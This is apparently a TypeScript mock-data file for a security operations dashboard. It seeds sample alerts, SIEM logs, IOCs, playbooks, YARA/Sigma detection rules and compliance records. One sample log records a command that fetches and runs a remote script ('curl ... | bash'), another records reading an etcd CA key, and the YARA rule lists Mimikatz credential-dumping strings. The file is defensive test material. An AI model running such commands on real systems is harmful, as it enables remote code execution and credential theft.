import {
  Alert,
  SiemLog,
  MalwareSample,
  IOC,
  SoarPlaybook,
  UserBehaviorProfile,
  EnterpriseAsset,
  DetectionRule,
  MitreTechnique,
  ComplianceFramework,
  Tenant,
  AuditLogEntry,
} from "../types";

export const initialAlerts: Alert[] = [
  {
    id: "ALT-2026-8901",
    title: "LSASS Memory Injection Detected (Mimikatz)",
    category: "Privilege Escalation",
    severity: "Critical",
    status: "Investigating",
    timestamp: "2026-08-01T07:01:12Z",
    sourceIp: "10.0.4.112",
    destinationIp: "10.0.0.5",
    user: "admin_jdoe",
    device: "DC-PRIMARY-01",
    description: "Suspicious process handle acquired for lsass.exe by unverified binary rundll32.exe from C:\\Users\\Public\\Temp.",
    mitreTactic: "Credential Access",
    mitreTechnique: "OS Credential Dumping",
    mitreTechniqueId: "T1003.001",
    iocHash: "8f4e21a990e1b32f11c778a4f00122e1b12239aa",
    score: 98,
  },
  {
    id: "ALT-2026-8900",
    title: "Obfuscated PowerShell Script Execution",
    category: "HIDS Suspicious Execution",
    severity: "High",
    status: "Unassigned",
    timestamp: "2026-08-01T06:58:40Z",
    sourceIp: "10.0.12.45",
    destinationIp: "185.220.101.5",
    user: "dev_alice",
    device: "WS-DEV-LAPTOP4",
    description: "PowerShell process spawned with '-EncodedCommand JABjAGwAaQBlAG4AdAA...' attempting external socket connection.",
    mitreTactic: "Execution",
    mitreTechnique: "Command and Scripting Interpreter",
    mitreTechniqueId: "T1059.001",
    iocHash: "43e21ba228e09f1100223f11bc0991823901a881",
    score: 86,
  },
  {
    id: "ALT-2026-8899",
    title: "SSH Brute Force Attack from Known Tor Exit Node",
    category: "Brute Force",
    severity: "High",
    status: "Mitigated",
    timestamp: "2026-08-01T06:45:00Z",
    sourceIp: "185.220.101.9",
    destinationIp: "10.0.1.200",
    user: "root",
    device: "PROD-EDGE-GATEWAY",
    description: "Over 450 failed SSH authentication attempts within 60 seconds from IP flagged in Threat Intel feed (Tor Exit Node).",
    mitreTactic: "Credential Access",
    mitreTechnique: "Brute Force",
    mitreTechniqueId: "T1110.001",
    score: 82,
  },
  {
    id: "ALT-2026-8898",
    title: "UEBA Anomaly: Impossible Travel Triggered",
    category: "UEBA Anomaly",
    severity: "Medium",
    status: "Investigating",
    timestamp: "2026-08-01T06:30:15Z",
    sourceIp: "103.251.140.2",
    destinationIp: "10.0.0.1",
    user: "fin_mwilson",
    device: "O365 Cloud Session",
    description: "User logged in from London, UK at 06:10 UTC and then from Tokyo, Japan at 06:30 UTC without VPN clearance.",
    mitreTactic: "Initial Access",
    mitreTechnique: "Valid Accounts",
    mitreTechniqueId: "T1078.004",
    score: 74,
  },
  {
    id: "ALT-2026-8897",
    title: "DNS Tunneling Payload Detected (C2 Beaconing)",
    category: "C2 Communication",
    severity: "Critical",
    status: "Unassigned",
    timestamp: "2026-08-01T06:12:08Z",
    sourceIp: "10.0.8.88",
    destinationIp: "8.8.8.8",
    user: "svc_backup",
    device: "SRV-FILE-STORE",
    description: "Abnormal volume of high-entropy TXT subdomains queried (e.g. x7a8f9.a3b2.c2-exfil-domain.com).",
    mitreTactic: "Command and Control",
    mitreTechnique: "Application Layer Protocol: DNS",
    mitreTechniqueId: "T1071.004",
    score: 95,
  },
  {
    id: "ALT-2026-8896",
    title: "Mass File Extension Modification (.locked Ransomware)",
    category: "Malware",
    severity: "Critical",
    status: "Escalated",
    timestamp: "2026-08-01T05:50:33Z",
    sourceIp: "10.0.15.22",
    destinationIp: "10.0.15.22",
    user: "hr_sross",
    device: "WS-HR-DESK02",
    description: "Local endpoint kernel driver detected 1,200 file write operations per second with extension appended as '.sentinel_locked'.",
    mitreTactic: "Impact",
    mitreTechnique: "Data Encrypted for Impact",
    mitreTechniqueId: "T1486",
    score: 99,
  }
];

export const initialSiemLogs: SiemLog[] = [
  {
    id: "LOG-100291",
    timestamp: "2026-08-01T07:05:01Z",
    logSource: "Windows Security",
    eventId: "4625",
    host: "DC-PRIMARY-01",
    user: "admin_jdoe",
    ip: "10.0.4.112",
    message: "An account failed to log on. Failure Reason: Unknown user name or bad password. Logon Type: 3 (Network).",
    level: "WARN",
    rawJson: `{"EventID":4625,"TargetUser":"admin_jdoe","Status":"0xc000006d","IpAddress":"10.0.4.112","ProcessName":"C:\\Windows\\System32\\lsass.exe"}`,
  },
  {
    id: "LOG-100290",
    timestamp: "2026-08-01T07:04:45Z",
    logSource: "Syslog Linux",
    eventId: "execve",
    host: "PROD-EDGE-GATEWAY",
    user: "root",
    ip: "185.220.101.9",
    message: "auditd: TYPE=EXECVE msg=audit(1785567885.102:441): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"curl -s http://185.220.101.5/sh | bash\"",
    level: "CRITICAL",
    rawJson: `{"type":"EXECVE","exe":"/usr/bin/curl","args":["-s","http://185.220.101.5/sh"],"pid":4120,"uid":0}`,
  },
  {
    id: "LOG-100289",
    timestamp: "2026-08-01T07:03:10Z",
    logSource: "AWS CloudTrail",
    eventId: "ConsoleLogin",
    host: "aws-prod-account",
    user: "dev_alice",
    ip: "103.251.140.2",
    message: "AWS ConsoleLogin succeeded without MFA challenge enforced. UserAgent: Mozilla/5.0 (Kali Linux x86_64).",
    level: "ERROR",
    rawJson: `{"eventName":"ConsoleLogin","mfaUsed":"No","sourceIPAddress":"103.251.140.2","userIdentity":{"arn":"arn:aws:iam::123456789:user/dev_alice"}}`,
  },
  {
    id: "LOG-100288",
    timestamp: "2026-08-01T07:01:22Z",
    logSource: "PaloAlto Firewall",
    eventId: "TRAFFIC_DROP",
    host: "FW-PERIMETER-01",
    user: "N/A",
    ip: "10.0.8.88",
    message: "PACKET_DROP: Outbound connection to suspicious IP 185.220.101.5:443 blocked by Threat Threat Intelligence rule #891.",
    level: "INFO",
    rawJson: `{"action":"deny","src_ip":"10.0.8.88","dst_ip":"185.220.101.5","dst_port":443,"app":"ssl"}`,
  },
  {
    id: "LOG-100287",
    timestamp: "2026-08-01T07:00:00Z",
    logSource: "K8s Audit",
    eventId: "pod/exec",
    host: "k8s-cluster-us-east",
    user: "system:serviceaccount:default",
    ip: "10.244.0.12",
    message: "Pod exec executed on namespace 'kube-system' container 'etcd'. Command: ['cat', '/etc/kubernetes/pki/etcd/ca.key']",
    level: "CRITICAL",
    rawJson: `{"verb":"create","uri":"/api/v1/namespaces/kube-system/pods/etcd/exec","user":{"username":"system:serviceaccount"}}`,
  }
];

export const initialMalwareSamples: MalwareSample[] = [
  {
    id: "MAL-001",
    filename: "invoice_august_2026.exe",
    sizeBytes: 482012,
    md5: "5d41402abc4b2a76b9719d911017c592",
    sha256: "8f4e21a990e1b32f11c778a4f00122e1b12239aa8f4e21a990e1b32f11c778a4",
    uploadDate: "2026-08-01 06:12",
    verdict: "Malicious",
    threatScore: 96,
    entropy: 7.92,
    submittingUser: "fin_mwilson",
    mitreTechniques: ["T1055 Process Injection", "T1003 Credential Dumping", "T1071 C2 Protocols"],
    yaraMatches: ["rule_win_mimikatz_strings", "rule_packed_upx_v3"],
    c2Ips: ["185.220.101.5", "194.165.16.81"],
  },
  {
    id: "MAL-002",
    filename: "update_agent_v2.ps1",
    sizeBytes: 12400,
    md5: "22a310bb2189a01124f11a881901a110",
    sha256: "43e21ba228e09f1100223f11bc0991823901a8818f4e21a990e1b32f11c778a4",
    uploadDate: "2026-08-01 05:40",
    verdict: "Suspicious",
    threatScore: 78,
    entropy: 6.45,
    submittingUser: "dev_alice",
    mitreTechniques: ["T1059.001 PowerShell", "T1027 Obfuscated Code"],
    yaraMatches: ["rule_powershell_base64_downloadstring"],
    c2Ips: ["103.251.140.2"],
  }
];

export const initialIocs: IOC[] = [
  {
    id: "IOC-901",
    type: "IP",
    value: "185.220.101.5",
    threatGroup: "APT28 (Fancy Bear)",
    confidenceScore: 98,
    firstSeen: "2026-07-15",
    lastSeen: "2026-08-01",
    feedSource: "AlienVault OTX & AbuseIPDB",
    tags: ["Tor Exit Node", "C2 Infrastructure", "Ransomware Dropper"],
  },
  {
    id: "IOC-902",
    type: "SHA256",
    value: "8f4e21a990e1b32f11c778a4f00122e1b12239aa8f4e21a990e1b32f11c778a4",
    threatGroup: "Lazarus Group (APT38)",
    confidenceScore: 95,
    firstSeen: "2026-07-28",
    lastSeen: "2026-08-01",
    feedSource: "VirusTotal Enterprise Feed",
    tags: ["Mimikatz Variant", "Credential Harvester"],
  },
  {
    id: "IOC-903",
    type: "Domain",
    value: "c2-exfil-domain.com",
    threatGroup: "FIN7 / Cobalt Group",
    confidenceScore: 89,
    firstSeen: "2026-07-20",
    lastSeen: "2026-08-01",
    feedSource: "CrowdStrike Threat Graph",
    tags: ["DNS Tunneling", "Data Exfiltration"],
  },
  {
    id: "IOC-904",
    type: "URL",
    value: "http://185.220.101.5/payload/stage2.dll",
    threatGroup: "APT29 (Cozy Bear)",
    confidenceScore: 92,
    firstSeen: "2026-07-30",
    lastSeen: "2026-08-01",
    feedSource: "MISP Threat Sharing",
    tags: ["DLL Side-Loading", "Stage-2 Loader"],
  }
];

export const initialPlaybooks: SoarPlaybook[] = [
  {
    id: "PLAY-01",
    name: "Automated Ransomware Containment",
    triggerCategory: "Malware",
    minSeverity: "Critical",
    autoExecute: true,
    lastExecuted: "2026-08-01 05:51",
    totalRuns: 14,
    successRate: 100,
    steps: [
      { stepNumber: 1, name: "Enrich IOCs via Threat Intelligence", description: "Query VirusTotal & AbuseIPDB for hash/IP score", automated: true, actionType: "ENRICH_INTEL", target: "Malware File Hash", status: "Success" },
      { stepNumber: 2, name: "Isolate Endpoint Host", description: "Trigger CrowdStrike/SentinelOne host isolation", automated: true, actionType: "ISOLATE_HOST", target: "Affected Workstation", status: "Success" },
      { stepNumber: 3, name: "Kill Malicious Process Tree", description: "Send SIGKILL to PID and terminate parent handles", automated: true, actionType: "KILL_PROCESS", target: "rundll32.exe / powershell.exe", status: "Success" },
      { stepNumber: 4, name: "Block Perimeter C2 IP", description: "Update Palo Alto & Fortinet firewall block rules", automated: true, actionType: "BLOCK_IP", target: "185.220.101.5", status: "Success" },
      { stepNumber: 5, name: "Notify Incident Response Team", description: "Send PagerDuty alert & create Jira Security Ticket", automated: true, actionType: "NOTIFY_SLACK", target: "#sec-ops-critical", status: "Success" },
    ],
  },
  {
    id: "PLAY-02",
    name: "Credential Compromise Isolation",
    triggerCategory: "Privilege Escalation",
    minSeverity: "High",
    autoExecute: true,
    lastExecuted: "2026-08-01 07:02",
    totalRuns: 38,
    successRate: 97,
    steps: [
      { stepNumber: 1, name: "Revoke Active User Tokens", description: "Invalidate Azure AD OAuth tokens & force session sign-out", automated: true, actionType: "REVOKE_SESSION", target: "admin_jdoe", status: "Success" },
      { stepNumber: 2, name: "Reset Domain Password", description: "Flag Active Directory account for mandatory password change", automated: true, actionType: "REVOKE_SESSION", target: "admin_jdoe", status: "Success" },
      { stepNumber: 3, name: "Alert CISO & Lead SOC", description: "Dispatch encrypted summary to CISO dashboard", automated: true, actionType: "NOTIFY_SLACK", target: "ciso-alerts", status: "Success" },
    ],
  }
];

export const initialUserProfiles: UserBehaviorProfile[] = [
  {
    id: "USR-01",
    username: "admin_jdoe",
    department: "IT Infrastructure",
    role: "Domain Administrator",
    riskScore: 92,
    anomalyType: "LSASS Access & Off-Hours Privileged Command",
    lastActive: "2 mins ago",
    device: "DC-PRIMARY-01",
    unusualActivityCount: 12,
    geoLocations: ["London, UK", "Frankfurt, DE"],
    failedLogins24h: 8,
  },
  {
    id: "USR-02",
    username: "dev_alice",
    department: "Software Engineering",
    role: "Senior Backend Developer",
    riskScore: 78,
    anomalyType: "Base64 Encoded PowerShell & AWS MFA Bypass",
    lastActive: "5 mins ago",
    device: "WS-DEV-LAPTOP4",
    unusualActivityCount: 5,
    geoLocations: ["Tokyo, JP", "San Francisco, US"],
    failedLogins24h: 14,
  },
  {
    id: "USR-03",
    username: "fin_mwilson",
    department: "Finance",
    role: "Financial Controller",
    riskScore: 64,
    anomalyType: "Impossible Travel Login within 20 minutes",
    lastActive: "35 mins ago",
    device: "O365 Web Mail",
    unusualActivityCount: 3,
    geoLocations: ["London, UK", "Tokyo, JP"],
    failedLogins24h: 3,
  }
];

export const initialAssets: EnterpriseAsset[] = [
  {
    id: "AST-101",
    hostname: "DC-PRIMARY-01",
    ipAddress: "10.0.0.5",
    os: "Windows Server 2022 Datacenter",
    type: "Server",
    riskScore: 94,
    agentVersion: "AWM Guard v4.8.2",
    agentStatus: "Online",
    lastScanTime: "2026-08-01 06:00",
    vulnerabilities: [
      { id: "VULN-01", cveId: "CVE-2024-3094", title: "XZ Utils Malicious Backdoor", cvssScore: 10.0, severity: "Critical", affectedPackage: "liblzma.so.5.6.0", patchAvailable: true, remediationCommand: "apt-get update && apt-get install --only-upgrade liblzma5" },
      { id: "VULN-02", cveId: "CVE-2021-44228", title: "Apache Log4j Remote Code Execution (Log4Shell)", cvssScore: 10.0, severity: "Critical", affectedPackage: "log4j-core-2.14.1.jar", patchAvailable: true, remediationCommand: "upgrade log4j-core to 2.17.1+" },
    ],
  },
  {
    id: "AST-102",
    hostname: "PROD-EDGE-GATEWAY",
    ipAddress: "10.0.1.200",
    os: "Ubuntu 24.04 LTS Kernel 6.8",
    type: "Server",
    riskScore: 82,
    agentVersion: "AWM Guard v4.8.2",
    agentStatus: "Online",
    lastScanTime: "2026-08-01 05:30",
    vulnerabilities: [
      { id: "VULN-03", cveId: "CVE-2023-38606", title: "Apple / Kernel Privilege Escalation Exploit", cvssScore: 8.8, severity: "High", affectedPackage: "kernel-headers-6.1", patchAvailable: true, remediationCommand: "sysctl -w kernel.unprivileged_userns_clone=0" },
    ],
  }
];

export const initialRules: DetectionRule[] = [
  {
    id: "RUL-01",
    type: "YARA",
    name: "Win_Mimikatz_LSASS_Dumping",
    target: "Process Memory & Executables",
    severity: "Critical",
    author: "AWM Cyber AI Threat Research",
    content: `rule Win_Mimikatz_LSASS_Dumping {
  meta:
    description = "Detects Mimikatz memory dump signatures and privilege constants"
    author = "AWM Cyber AI Threat Team"
    severity = "CRITICAL"
  strings:
    $s1 = "sekurlsa::logonpasswords" ascii wide nocase
    $s2 = "lsadump::sam" ascii wide nocase
    $s3 = "privilege::debug" ascii wide nocase
    $s4 = "wdigest.dll" ascii wide nocase
  condition:
    uint16(0) == 0x5A4D and 2 of ($s*)
}`,
    enabled: true,
    lastMatched: "2026-08-01 07:01",
    matchCount: 18,
  },
  {
    id: "RUL-02",
    type: "Sigma",
    name: "proc_creation_win_powershell_base64_encoded",
    target: "Windows Security Event 4688",
    severity: "High",
    author: "Sigma HQ / AWM Cyber AI",
    content: `title: Suspicious Encoded PowerShell Execution
status: experimental
description: Detects powershell execution with base64 encoded payload
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - ' -e '
            - ' -enc '
            - ' -encodedcommand '
    condition: selection
falsepositives:
    - Administrative software installer scripts`,
    enabled: true,
    lastMatched: "2026-08-01 06:58",
    matchCount: 42,
  }
];

export const initialMitreTechniques: MitreTechnique[] = [
  { id: "T1059", name: "Command and Scripting Interpreter", tactic: "Execution", subTechniquesCount: 8, detectionCount: 42, riskLevel: "High", description: "Adversaries may abuse command and script interpreters to execute commands or scripts.", mitigation: "Restrict PowerShell execution policy, enforce AppLocker / WDAC." },
  { id: "T1003", name: "OS Credential Dumping", tactic: "Credential Access", subTechniquesCount: 6, detectionCount: 18, riskLevel: "Critical", description: "Adversaries may attempt to dump credentials from the operating system, memory (LSASS), or SAM database.", mitigation: "Enable Windows Defender Credential Guard, audit LSASS access handles." },
  { id: "T1055", name: "Process Injection", tactic: "Defense Evasion", subTechniquesCount: 11, detectionCount: 25, riskLevel: "Critical", description: "Adversaries may inject code into processes to evade process-based defenses.", mitigation: "Endpoint detection and response (EDR) memory scanning." },
  { id: "T1110", name: "Brute Force", tactic: "Credential Access", subTechniquesCount: 4, detectionCount: 89, riskLevel: "High", description: "Adversaries may use brute force attacks to gain access to accounts.", mitigation: "Enforce multi-factor authentication (MFA) and rate-limit authentication endpoints." },
  { id: "T1071", name: "Application Layer Protocol", tactic: "Command and Control", subTechniquesCount: 4, detectionCount: 31, riskLevel: "Critical", description: "Adversaries may communicate using application layer protocols (HTTP/DNS Tunneling) to blend in with normal traffic.", mitigation: "Inspect DNS TXT record lengths and mandate outbound web proxies." },
  { id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact", subTechniquesCount: 0, detectionCount: 14, riskLevel: "Critical", description: "Adversaries may encrypt data on target systems to interrupt availability.", mitigation: "Immutable off-site backups, host file-integrity protection." }
];

export const initialComplianceFrameworks: ComplianceFramework[] = [
  {
    id: "COMP-NIST",
    name: "NIST SP 800-53",
    score: 94,
    passedControls: 188,
    totalControls: 200,
    controls: [
      { id: "AC-2", code: "AC-2", name: "Account Management & Audit", status: "Compliant", evidenceCount: 142, lastAudited: "2026-07-28" },
      { id: "AC-6", code: "AC-6", name: "Least Privilege Enforced", status: "Compliant", evidenceCount: 89, lastAudited: "2026-07-28" },
      { id: "SI-4", code: "SI-4", name: "Information System Monitoring (SIEM/NIDS)", status: "Compliant", evidenceCount: 320, lastAudited: "2026-08-01" },
      { id: "IR-4", code: "IR-4", name: "Incident Handling & SOAR Automation", status: "In Review", evidenceCount: 18, lastAudited: "2026-08-01" },
    ],
  },
  {
    id: "COMP-ISO",
    name: "ISO 27001",
    score: 91,
    passedControls: 104,
    totalControls: 114,
    controls: [
      { id: "A.12.6.1", code: "A.12.6.1", name: "Management of Technical Vulnerabilities", status: "Compliant", evidenceCount: 52, lastAudited: "2026-07-30" },
      { id: "A.13.1.1", code: "A.13.1.1", name: "Network Security Controls & Firewalls", status: "Compliant", evidenceCount: 110, lastAudited: "2026-07-30" },
    ],
  },
  {
    id: "COMP-SOC2",
    name: "SOC 2 Type II",
    score: 96,
    passedControls: 48,
    totalControls: 50,
    controls: [
      { id: "CC6.1", code: "CC6.1", name: "Logical Access Security Boundaries", status: "Compliant", evidenceCount: 76, lastAudited: "2026-07-25" },
      { id: "CC7.2", code: "CC7.2", name: "Anomalous Activity Detection & UEBA", status: "Compliant", evidenceCount: 94, lastAudited: "2026-08-01" },
    ],
  }
];

export const initialTenants: Tenant[] = [
  { id: "TNT-01", name: "Acme Financial Global", tier: "Enterprise Pro", activeAgents: 1420, monthlyLogVolumeGb: 8500 },
  { id: "TNT-02", name: "Apex HealthSystems", tier: "Government Cloud", activeAgents: 890, monthlyLogVolumeGb: 4200 },
  { id: "TNT-03", name: "FinTech Cloud Services", tier: "MSSP Global", activeAgents: 3100, monthlyLogVolumeGb: 18200 },
];

export const initialAuditLogs: AuditLogEntry[] = [
  { id: "AUD-001", timestamp: "2026-08-01 07:02:10", actor: "lead_analyst_sarah", role: "SOC Lead", action: "Triggered SOAR Playbook 'Automated Ransomware Containment'", target: "WS-HR-DESK02", ipAddress: "10.0.1.15", hash: "a3f890c218200" },
  { id: "AUD-002", timestamp: "2026-08-01 06:45:30", actor: "system_soar_daemon", role: "System Service", action: "Auto-blocked IP 185.220.101.9 on PaloAlto Firewall", target: "FW-PERIMETER-01", ipAddress: "127.0.0.1", hash: "991823fbc0112" },
  { id: "AUD-003", timestamp: "2026-08-01 06:12:00", actor: "ciso_david", role: "CISO", action: "Generated Executive NIST SP 800-53 Compliance Report", target: "NIST Audit Export", ipAddress: "10.0.1.10", hash: "e12f0011244ac" },
];
